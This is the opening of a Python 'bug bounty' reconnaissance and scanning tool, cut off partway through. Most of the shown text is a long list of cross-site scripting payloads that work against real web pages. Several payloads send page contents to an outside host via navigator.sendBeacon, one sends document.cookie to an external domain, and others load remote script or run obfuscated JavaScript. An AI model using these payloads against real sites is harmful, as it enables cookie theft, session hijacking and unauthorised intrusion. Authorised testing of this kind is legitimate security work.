#!/usr/bin/env python3
"""
Advanced Bug Bounty Automation Tool
A comprehensive reconnaissance and vulnerability scanning framework
"""

import os
import sys
import json
import time
import threading
import subprocess
import argparse
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
from urllib.parse import urlparse, urljoin, quote
import re
from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import logging
import socket
import dns.resolver
from bs4 import BeautifulSoup
import hashlib
import base64

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedBugBountyTool:
    def __init__(self, target_domain, output_dir="results"):
        self.target_domain = target_domain.replace("http://", "").replace("https://", "")
        self.output_dir = Path(output_dir) / self.target_domain
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Results storage - comprehensive structure
        self.results = {
            'target': self.target_domain,
            'timestamp': datetime.now().isoformat(),
            'subdomains': [],
            'live_subdomains': [],
            'urls': [],
            'sensitive_files': [],
            'vulnerabilities': [],
            'open_ports': [],
            'js_files': [],
            'parameters': [],
            'cors_issues': [],
            'xss_vulnerabilities': [],
            'lfi_vulnerabilities': [],
            'sql_injection': [],
            'subdomain_takeover': [],
            'aws_s3_buckets': [],
            'api_keys': [],
            'wordpress_scan': [],
            'directory_bruteforce': [],
            'technology_stack': [],
            'dns_records': [],
            'ssl_info': [],
            'wayback_urls': [],
            'github_repos': [],
            'email_addresses': [],
            'phone_numbers': [],
            'social_media': [],
            'status': 'initialized'
        }
        
        # Enhanced wordlists
        self.common_subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
            'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'mobile', 'dev', 'stage',
            'api', 'blog', 'shop', 'admin', 'test', 'secure', 'vpn', 'git', 'jenkins',
            'docker', 'kubernetes', 'gitlab', 'bitbucket', 'jira', 'confluence', 'wiki'
        ]
        
        self.sensitive_extensions = [
            'xls', 'xml', 'xlsx', 'json', 'pdf', 'sql', 'doc', 'docx', 'pptx', 'txt',
            'zip', 'tar.gz', 'tgz', 'bak', '7z', 'rar', 'log', 'cache', 'secret', 'db',
            'backup', 'yml', 'gz', 'config', 'csv', 'yaml', 'md', 'md5', 'tar', 'xz',
            '7zip', 'p12', 'pem', 'key', 'crt', 'csr', 'sh', 'pl', 'py', 'java', 'class',
            'jar', 'war', 'ear', 'sqlitedb', 'sqlite3', 'dbf', 'db3', 'accdb', 'mdb',
            'sqlcipher', 'gitignore', 'env', 'ini', 'conf', 'properties', 'plist', 'cfg'
        ]
        
        self.xss_payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    # Below are the newly added payloads
    '<xss onafterscriptexecute=alert(1)><script>1</script>',
    '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>',
    '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>',
    '<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>',
    '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>',
    '<body onbeforeprint=console.log(1)>',
    '<xss onbeforescriptexecute=alert(1)><script>1</script>',
    '<body onbeforeunload=navigator.sendBeacon(\'//ssl.portswigger-labs.net/\',document.body.innerHTML)>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    '<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>',
    '<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>',
    '<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>',
    '<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE 1 00:00:00.000 --> 00:00:05.000 <b>XSS</b> "></video>',
    '<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>',
    '<svg><animate onend=alert(1) attributeName=x dur=1s>',
    '<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    '<audio src/onerror=alert(1)>',
    '<a id=x tabindex=1 onfocus=alert(1)></a>',
    '<xss onfocus=alert(1) autofocus tabindex=1>',
    '<a id=x tabindex=1 onfocusin=alert(1)></a>',
    '<body onhashchange="print()">',
    '<body onload=alert(1)>',
    '<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    '<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>',
    '<video onloadstart="alert(1)"><source></xss>',
    '<body onmessage=print()>',
    '<body onpagereveal=alert(1)>',
    '<body onpageshow=alert(1)>',
    '<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    '<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    '<body onpopstate=print()>',
    '<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>',
    '<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />',
    '<body onresize="print()">',
    '<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>',
    '<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>',
    '<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>',
    '<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <xss class="scroll-item">Item 1</xss><xss class="scroll-item">Item 2</xss></xss>',
    '<xss onsecuritypolicyviolation=alert(1)>XSS</xss>',
    '<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>',
    '<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    '<details ontoggle=alert(1) open>test</details>',
    '<style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss>',
    '<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>',
    '<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss>',
    '<style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss>',
    '<body onunhandledrejection=alert(1)><script>fetch(\'//xyz\')</script>',
    '<body onunload=navigator.sendBeacon(\'//ssl.portswigger-labs.net/\',document.body.innerHTML)>',
    '<audio controls loop muted autoplay onwaiting=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>',
    '<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss>',
    '<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>',
    '<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>',
    '<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>',
    '<style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xss>',
    '<body onafterprint=alert(1)>',
    '<input onauxclick=alert(1)>',
    '<a onbeforecopy="alert(1)" contenteditable>test</a>',
    '<a onbeforecut="alert(1)" contenteditable>test</a>',
    '<xss contenteditable onbeforeinput=alert(1)>test',
    '<xss onbeforepaste=alert(1)>XSS</xss>',
    '<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>',
    '<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>',
    '<input type=file oncancel=alert(1)>',
    '<input onchange=alert(1) value=xss>',
    '<xss onclick="alert(1)" style=display:block>test</xss>',
    '<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>',
    '<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>',
    '<xss oncontextmenu="alert(1)" style=display:block>test</xss>',
    '<xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test',
    '<xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test',
    '<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>',
    '<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>',
    '<xss draggable="true" ondragend="alert(1)" style=display:block>test</xss>',
    '<xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss>',
    '<xss draggable="true" ondragexit="alert(1)" style=display:block>test</xss>',
    '<xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss>',
    '<div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>',
    '<xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss>',
    '<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>',
    '<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>',
    '<form onformdata="alert(1)"><button>Click</button></form>',
    '<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>',
    '<div ongesturechange=alert(1)>XSS</div>',
    '<div ongestureend=alert(1)>XSS</div>',
    '<div ongesturestart=alert(1)>XSS</div>',
    '<input oninput=alert(1) value=xss>',
    '<form><input oninvalid=alert(1) required><input type=submit>',
    '<xss onkeydown="alert(1)" contenteditable style=display:block>test</xss>',
    '<xss onkeypress="alert(1)" contenteditable style=display:block>test</xss>',
    '<xss onkeyup="alert(1)" contenteditable style=display:block>test</xss>',
    '<xss onmousedown="alert(1)" style=display:block>test</xss>',
    '<xss onmouseenter="alert(1)" style=display:block>test</xss>',
    '<xss onmouseleave="alert(1)" style=display:block>test</xss>',
    '<xss onmousemove="alert(1)" style=display:block>test</xss>',
    '<xss onmouseout="alert(1)" style=display:block>test</xss>',
    '<xss onmouseover="alert(1)" style=display:block>test</xss>',
    '<xss onmouseup="alert(1)" style=display:block>test</xss>',
    '<xss onmousewheel=alert(1) style=display:block>requires scrolling',
    '<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>',
    '<body onpagehide=navigator.sendBeacon(\'//ssl.portswigger-labs.net/\',document.body.innerHTML)>',
    '<body onpageswap=navigator.sendBeacon(\'//ssl.portswigger-labs.net/\',document.body.innerHTML)>',
    '<a onpaste="alert(1)" contenteditable>test</a>',
    '<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    '<xss onpointercancel=alert(1)>XSS</xss>',
    '<xss onpointerdown=alert(1) style=display:block>XSS</xss>',
    '<xss onpointerenter=alert(1) style=display:block>XSS</xss>',
    '<xss onpointerleave=alert(1) style=display:block>XSS</xss>',
    '<xss onpointermove=alert(1) style=display:block>XSS</xss>',
    '<xss onpointerout=alert(1) style=display:block>XSS</xss>',
    '<xss onpointerover=alert(1) style=display:block>XSS</xss>',
    '<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>',
    '<xss onpointerup=alert(1) style=display:block>XSS</xss>',
    '<audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    '<form onreset=alert(1)><input type=reset>',
    '<form><input type=search onsearch=alert(1) value="Hit return" autofocus>',
    '<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    '<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    '<input onselect=alert(1) value="XSS" autofocus>',
    '<body onselectionchange=alert(1)>select some text',
    '<body onselectstart=alert(1)>select some text',
    '<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>',
    '<form onsubmit=alert(1)><input type=submit>',
    '<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>',
    '<xss ontouchcancel=alert(1)>XSS</xss>',
    '<body ontouchend=alert(1)>',
    '<body ontouchmove=alert(1)>',
    '<body ontouchstart=alert(1)>',
    '<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    '<audio controls onwaiting=alert(1)><source src=x type=x></audio>',
    '<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>',
    '<xss onwebkitmouseforcechanged=alert(1)>XSS</xss>',
    '<xss onwebkitmouseforcedown=alert(1)>XSS</xss>',
    '<xss onwebkitmouseforceup=alert(1)>XSS</xss>',
    '<xss onwebkitmouseforcewillbegin=alert(1)>XSS</xss>',
    '<video controls src=validvideo.mp4 onwebkitpresentationmodechanged=alert(1)>',
    '<xss onwebkitwillrevealbottom=alert(1)>XSS</xss>',
    '<body onwheel=alert(1)>',
    '<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>',
    '<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>',
    '<style><img title="</style><img src onerror=alert(1)>"></style>',
    '<script><img title="</script><img src onerror=alert(1)>"></script>',
    '<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>',
    '<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>',
    '<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>',
    '<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>',
    '<title><img title="</title><img src onerror=alert(1)>"></title>',
    '<input type="file" id="fileInput" /><script>const fileInput = document.getElementById(\'fileInput\');const dataTransfer = new DataTransfer();const file = new File([\'Hello world!\'], \'hello.txt\', {type: \'text/plain\'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>',
    '<script>onerror=alert;throw 1</script>',
    '<script>{onerror=alert}throw 1</script>',
    '<script>throw onerror=alert,1</script>',
    '<script>throw onerror=eval,\'=alert\\x281\\x29\'</script>',
    '<script>throw onerror=eval,\'alert\\x281\\x29\'</script>',
    '<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:\'alert\\x281\\x29\'}</script>',
    '<script>throw onerror=eval,e=new Error,e.message=\'alert\\x281\\x29\',e</script>',
    '<script>throw onerror=Uncaught=eval,e=new Error,e.message=\'/*\'+location.hash,!!window.InstallTrigger?e:e.message</script>',
    '<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>',
    '<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>',
    '<script>\'alert\\x281\\x29\'instanceof{[Symbol.hasInstance]:eval}</script>',
    '<script>\'alert\\x281\\x29\'instanceof{[Symbol[\'hasInstance\']]:eval}</script>',
    '<script>location=\'javascript:alert\\x281\\x29\'</script>',
    '<script>location=name</script>',
    '<script>alert`1`</script>',
    '<script>new Function`X${document.location.hash.substr`1`}`</script>',
    '<script>Function`X${document.location.hash.substr`1`}```</script>',
    '<video><source onerror=location=/\\02.rs/+document.cookie>',
    '<svg onload=alert(1)',
    '<svg onload=alert(1)<!--',
    '<script>throw[onerror]=[alert],1</script>',
    '<script>var{a:onerror}={a:alert};throw 1</script>',
    '<script>var{haha:onerror=alert}=0;throw 1</script>',
    '<script>window.name=\'javascript:alert(1)\';</script><svg onload=location=name>',
    '<script>window.name=\'javascript:alert(1)\';function blah(){} blah(""+{a:location=name}+"")</script>',
    '<script>window.name=\'javascript:alert(1)\';function blah(){} blah(""+new class b{toString=e=>location=name}+"")</script>',
    '<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>',
    '<SCRIPT>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</SCRIPT>',
    '<script>throw onerror=eval,name</script>',
    '<script>throw onerror=eval,\'/*\'+location</script>',
    '<svg onload="throw top.onerror=eval,\'/*\'+URL">',
    '<body onload="throw onerror=eval,\'/*\'+location">',
    '<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>',
    '<svg onload="throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:\'/*\'+URL}">',
    '<body onload="throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:\'/*\'+location}">',
    '<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message=\'alert\\x281\\x29\'</script>',
    '<script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
    '<script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
    '<script>onpagereveal=setTimeout;Event.prototype.toString=AggregateError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
    '<script>onpageswap=setTimeout;location=\'x\';Event.prototype.toString=EvalError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
    '<iframe id=target></iframe><script>target.src=\'xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name="alert\\x281\\x29">\';target.onload=setTimeout(function(){frames[0].postMessage("", "*")},100)</script>',
    '<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags=\'.call\\x28alert\\x281\\x29\\x29\';Event.prototype.toString=/x/.toString</script>',
    '<script>onscroll=setTimeout;document.body.style.height=\'9999px\';document.documentElement.scrollTop=1;Event.prototype.toString=ReferenceError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
    '<script>onscrollend=setTimeout;document.body.style.height=\'9999px\';document.documentElement.scrollTop=1;Event.prototype.toString=SyntaxError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
    '<input value=x autofocus onfocus="window.onselect=setTimeout;this.selectionStart=1;Event.prototype.toString=TypeError.prototype.toString;Event.prototype.message=\'alert\\x281\\x29\'">',
    '<img/src/style=transition:0.1s onerror="window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>\'alert\\x281\\x29\'">',
    '<img/src/onerror="window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'">',
    '<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'>',
    '<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=\';alert\\x281\\x29;var\\x20Uncaught//\';z>',
    '<svg onload=onerror=eval;new\'"-alert\\x281\\x29//\'>',
    '<script>onerror=eval,new name</script>',
    '<xss class=progress-bar-animated onanimationstart=alert(1)>',
    '<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>',
    '<iframe src="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">XSS</a>',
    '<a href="JaVaScript:alert(1)">XSS</a>',
    '<a href=" javascript:alert(1)">XSS</a>',
    '<a href="javas\tcript:alert(1)">XSS</a>',
    '<a href="javascript\t:alert(1)">XSS</a>',
    '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>',
    '<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>',
    '<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>',
    '<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>',
    '<script src="data:text/javascript,alert(1)"></script>',
    '<svg><script href="data:text/javascript,alert(1)" />',
    '<svg><use href="data:image/svg+xml,<svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\' xmlns:xlink=\'http://www.w3.org/1999/xlink\' width=\'100\' height=\'100\'><a xlink:href=\'javascript:alert(1)\'><rect x=\'0\' y=\'0\' width=\'100\' height=\'100\' /></a></svg>#x"></use></svg>',
    '<script>import(\'data:text/javascript,alert(1)\')</script>',
    '<math><x href="javascript:alert(1)">blah',
    '<form><button formaction=javascript:alert(1)>XSS',
    '<form><input type=submit formaction=javascript:alert(1) value=XSS>',
    '<form action=javascript:alert(1)><input type=submit value=XSS>',
    '<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>',
    '<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\'&gt;&lt;image href=\'1\' onerror=\'alert(1)\' /&gt;&lt;/svg&gt;#x" /><use id=x />',
    '<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>',
    '<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>',
    '<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>',
    '<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>',
    '<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>',
    '<script>navigation.navigate(\'javascript:alert(1)\')</script>',
    '<object data=# codebase=javascript:alert(document.domain)//>',
    '<embed src=# codebase=javascript:alert(document.domain)//>',
    '<object data="# alert(1)" codebase=javascript://>',
    '<object data="#! alert(1)" codebase=javascript:>',
    '<embed src="# alert(1)" codebase=javascript://>',
    '<embed src="#! alert(1)" codebase=javascript:>',
    '<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>',
    '<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>',
    '<form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label>',
    '<input type="hidden" accesskey="X" onclick="alert(1)">',
    '<link rel="canonical" accesskey="X" onclick="alert(1)" />',
    '<a href=# download="filename.html">Test</a>',
    '<img referrerpolicy="no-referrer" src="//portswigger-labs.net">',
    '<a href=# onclick="window.open(\'http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\',\'alert(1)\')">XSS</a>',
    '<iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe>',
    '<base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a>',
    '<a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a>',
    '<img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map>',
    '<form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="\';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form>',
    '<form><input type=hidden name=x value="\';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form>',
    '<form><input type=hidden name=x value="\';eval(name)//"><input type=hidden name=context value=js_string_single><input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"></form>',
    '<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">',
    '<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-',
    '<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-',
    '+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-',
    '+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-',
    '+/v+ +ADw-script+AD4-alert(1)+ADw-/script+AD4-',
    '+/v/ +ADw-script+AD4-alert(1)+ADw-/script+AD4-',
    '<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">',
    '<iframe sandbox src="//portswigger-labs.net"></iframe>',
    '<meta name="referrer" content="no-referrer">',
    '<script>\\u0061lert(1)</script>',
    '<script>\\u{61}lert(1)</script>',
    '<script>\\u{0000000061}lert(1)</script>',
    '<script>eval(\'\\x61lert(1)\')</script>',
    '<script>eval(\'\\141lert(1)\')</script>',
    '<script>eval(\'alert(\\061)\')</script>',
    '<script>eval(\'alert(\\61)\')</script>',
    '<a href="&#106;avascript:alert(1)">XSS</a>',
    '<a href="&#106avascript:alert(1)">XSS</a>',
    '<svg><script>&#97;lert(1)</script></svg>',
    '<svg><script>&#x61;lert(1)</script></svg>',
    '<svg><script>alert&NewLine;(1)</script></svg>',
    '<svg><script>x="&quot;,alert(1)//";</script></svg>',
    '<a href="&#0000106avascript:alert(1)">XSS</a>',
    '<a href="&#x6a;avascript:alert(1)">XSS</a>',
    '<a href="j&#x61vascript:alert(1)">XSS</a>',
    '<a href="&#x6a avascript:alert(1)">XSS</a>',
    '<a href="&#x0000006a;avascript:alert(1)">XSS</a>',
    '<a href="&#X6A;avascript:alert(1)">XSS</a>',
    '<a href="javascript&colon;alert(1)">XSS</a>',
    '<a href="java&Tab;script:alert(1)">XSS</a>',
